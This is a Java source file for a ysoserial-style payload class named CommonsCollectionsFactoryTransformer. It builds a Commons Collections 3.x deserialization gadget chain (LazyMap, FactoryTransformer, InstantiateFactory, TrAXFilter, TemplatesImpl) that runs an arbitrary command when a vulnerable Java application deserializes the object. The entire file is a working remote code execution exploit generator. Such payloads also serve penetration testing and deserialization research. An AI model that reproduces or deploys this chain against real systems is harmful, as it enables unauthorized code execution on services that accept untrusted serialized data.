package ysoserial.payloads;

import org.apache.commons.collections.Factory;
import org.apache.commons.collections.functors.InstantiateFactory;
import org.apache.commons.collections.functors.FactoryTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;

import javax.xml.transform.Templates;
import java.io.Serializable;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/*
 * Work in CC3.0-.3.22
 * 核心就是 LazyMap.get() -> FactoryTransformer.transform() -> InstantiateFactory.create() -> TrAXFilter.TrAXFilter()
 * 参考代码审计星球和赛博回忆录星球 Y4tacker师傅 和 hiome师傅
* */
@Dependencies({"commons-collections:commons-collections:3.1"})
public class CommonsCollectionsFactoryTransformer extends PayloadRunner implements ObjectPayload<Serializable> {
    @Override
    public Serializable getObject(String command) throws Exception {
        //Payload
        Object templatesImpl = Gadgets.createTemplatesImpl(command);

        //Transformer chain
        Factory instantiateFactory = new InstantiateFactory(
            com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.class,
            new Class[]{Templates.class},
            new Object[]{templatesImpl}
        );
        FactoryTransformer objectObjectFactoryTransformer = new FactoryTransformer(instantiateFactory);

        //Trigger
        final HashMap innerMap = new HashMap();
        final Map lazyMap = LazyMap.decorate(innerMap, objectObjectFactoryTransformer);
        TiedMapEntry entry = new TiedMapEntry(new HashMap(), "foo");
        innerMap.put(entry, "xxx");

        Field mapField = TiedMapEntry.class.getDeclaredField("map");
        mapField.setAccessible(true);
        mapField.set(entry, lazyMap);

        return innerMap;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollectionsFactoryTransformer.class, args);
    }
}
